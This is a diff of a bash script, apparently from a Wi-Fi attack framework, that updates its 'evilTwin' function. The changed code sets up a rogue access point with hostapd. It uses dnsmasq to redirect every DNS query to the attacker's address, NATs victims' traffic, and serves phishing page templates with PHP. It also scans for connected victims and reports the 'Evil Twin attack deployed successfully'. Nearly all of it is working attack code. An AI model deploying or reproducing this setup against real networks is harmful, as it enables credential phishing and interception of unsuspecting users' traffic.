@@ -57,7 +57,7 @@ function ctrl_c(){
 function evil_c(){
 	echo -e "\n\n${blueColour}[${endColour}${yellowColour}!${endColour}${blueColour}] Removing files...${endColour}"
 	# Kill created processes
-	killall hostapd &>/dev/null ; killall dnsmasq &>/dev/null
+	killall hostapd dnsmasq php &>/dev/null
 	# Kill the http server
 	fuser -k 80/tcp &>/dev/null
 	# Reconfigure the network adapter
@@ -66,8 +66,6 @@ function evil_c(){
 	popd &>/dev/null
 	echo -e "\n${blueColour}[${endColour}${yellowColour}!${endColour}${blueColour}] Stoping hostapd and dnsmasq...${endColour}"
 	sleep 0.2
-	# Remove configurations files
-	rm hostapd.conf 2>/dev/null; rm dnsmasq.conf 2>/dev/null
 	iwconfig $evilCard mode managed 2>/dev/null
 	ifconfig $evilCard up 2>/dev/null
 	airmon-ng start $evilCard &>/dev/null
@@ -1428,12 +1426,19 @@ function evilTwin(){
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Adapter configured successfully${endColour}"
 	fuser -k 53/tcp &>/dev/null; fuser -k 80/tcp &>/dev/null
 	sleep 0.3
-	killall network-manager hostapd dnsmasq dhcpd 2>/dev/null
+	kill_network_services=$(awk -F '=' '/airmon_check_kill/ {print $2}' /opt/wef/wef.cnf)
+	if [ "${kill_network_services}" == "true" ]; then
+		airmon-ng check kill &>/dev/null
+	fi
+	killall hostapd dnsmasq dhcpd 2>/dev/null
 
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Name of your evil AP: ${endColour}" && read evil_name
 	sleep 0.2
 	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Channel of your AP: ${endColour}" && read def_channel
-	sleep 0.1
+	sleep 0.2
+	echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Password for your AP (leave blank for a public network): ${endColour}" && read AP_passw
+	sleep 0.2
+
 	test -d /sys/class/net/eth0
 	if [ "$(echo $?)" != "0" ]; then
 		echo -ne "\n${blueColour}[${endColour}${yellowColour}*${endColour}${blueColour}] Interface to route internet through (default=eth0): ${endColour}" && read interface_to_route
@@ -1446,39 +1451,56 @@ function evilTwin(){
 
 	echo -ne "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Creating malicious AP"; sleep 0.2; echo -ne "."; sleep 0.2; echo -ne "."; sleep 0.2; echo -ne ".${endColour}\n"
 	ifconfig $evilCard up; sleep 0.3
-	echo -e "interface=${evilCard}\n" > hostapd.conf
-	echo -e "ssid=${evil_name}\n" >> hostapd.conf
-	echo -e "hw_mode=g\n" >> hostapd.conf
-	echo -e "channel=${def_channel}\n" >> hostapd.conf
-	echo -e "macaddr_acl=0\n" >> hostapd.conf
-	echo -e "auth_algs=1\n" >> hostapd.conf
-	echo -e "ignore_broadcast_ssid=0\n" >> hostapd.conf
-	echo -e "ieee80211n=1\n" >> hostapd.conf
-	echo -e "wme_enabled=1\n" >> hostapd.conf
 
-	hostapd ./hostapd.conf > /dev/null 2>&1 &
+	# Creating hostapd configuration file
+	rm /opt/wef/cache/hostapd.conf >/dev/null 2>&1
+	echo "
+interface=${evilCard}
+ssid=${evil_name}
+hw_mode=a
+channel=${def_channel}
+macaddr_acl=0
+auth_algs=1
+ignore_broadcast_ssid=0
+ieee80211n=1
+wme_enabled=1
+driver=nl80211" >> /opt/wef/cache/hostapd.conf
+
+	if [ "$AP_passw" != "" ]; then
+	echo "
+wpa=2
+wpa_key_mgmt=WPA-PSK
+wpa_pairwise=TKIP
+rsn_pairwise=CCMP
+wpa_passphrase=$AP_passw" >> /opt/wef/cache/hostapd.conf
+	fi
+
+	hostapd /opt/wef/cache/hostapd.conf > /dev/null 2>&1 &
 
 	sleep 1
-	echo -e "interface=${evilCard}\n" > dnsmasq.conf
-	echo -e "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf
-	echo -e "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf
-	echo -e "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf
-	echo -e "server=8.8.8.8\n" >> dnsmasq.conf
-	echo -e "log-queries\n" >> dnsmasq.conf
-	echo -e "log-dhcp\n" >> dnsmasq.conf
-	echo -e "listen-address=127.0.0.1\n" >> dnsmasq.conf
-	echo -e "address=/#/192.168.1.1\n" >> dnsmasq.conf
+	# Creating dnsmasq configuration file
+	rm /opt/wef/cache/dnsmasq.conf >/dev/null 2>&1
+	echo "
+interface=${evilCard}
+dhcp-range=10.0.221.2,10.0.221.30,255.255.255.0,12h
+dhcp-option=3,10.0.221.1
+dhcp-option=6,10.0.221.1
+server=8.8.8.8
+log-queries
+log-dhcp
+listen-address=10.0.221.1
+address=/#/10.0.221.1" >> /opt/wef/cache/dnsmasq.conf
 
-	sleep 0.4
-	ifconfig $evilCard 192.168.1.1 netmask 255.255.255.0
+	ifconfig $evilCard 10.0.221.1 netmask 255.255.255.0
 	sleep 0.5
-	route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1
-	sleep 0.5
+	route add -net 10.0.221.0 netmask 255.255.255.0 gw 10.0.221.1
 
-	dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 &
+	dnsmasq -C /opt/wef/cache/dnsmasq.conf -d > /dev/null 2>&1 &
 
-	iptables --table nat --append POSTROUTING --out-interface ${interface_to_route} -j MASQUERADE
-	iptables --append FORWARD --in-interface ${evilCard} -j ACCEPT
+	iptables -t nat -A POSTROUTING -o $interface_to_route -j MASQUERADE
+	iptables -A FORWARD -i $interface_to_route -o $evilCard -m state --state RELATED,ESTABLISHED -j ACCEPT 
+	iptables -A FORWARD -i $evilCard -o $interface_to_route -j ACCEPT
+
 	echo 1 > /proc/sys/net/ipv4/ip_forward
 
 	templates=$(ls /opt/wef/main/templates | tr "\n" "," | sed 's/,/, /g' | sed 's/, $//' 2>/dev/null)
@@ -1496,7 +1518,7 @@ function evilTwin(){
 
 	sleep 0.3; pushd /opt/wef/main/templates/$template_name > /dev/null 2>&1
 
-	php -S 192.168.1.1:80 > /dev/null 2>&1 &
+	php -S 10.0.221.1:80 > /dev/null 2>&1 &
 
 	sleep 0.1; popd > /dev/null 2>&1
 	echo -e "\n${blueColour}[${endColour}${greenColour}+${endColour}${blueColour}] Evil Twin attack deployed successfully${endColour}"
@@ -1529,7 +1551,7 @@ function evilTwin(){
 
 		rm ip-log.tmp 2>/dev/null
 		for number in $(seq 2 254); do
-		        timeout 1 bash -c "ping -c 1 192.168.1.${number}" &>/dev/null && echo -e "192.168.1.${number}" >> ip-log.tmp &
+		        timeout 1 bash -c "ping -c 1 10.0.221.${number}" &>/dev/null && echo -e "10.0.221.${number}" >> ip-log.tmp &
 		done; sleep 4
 
 		test -f ip-log.tmp
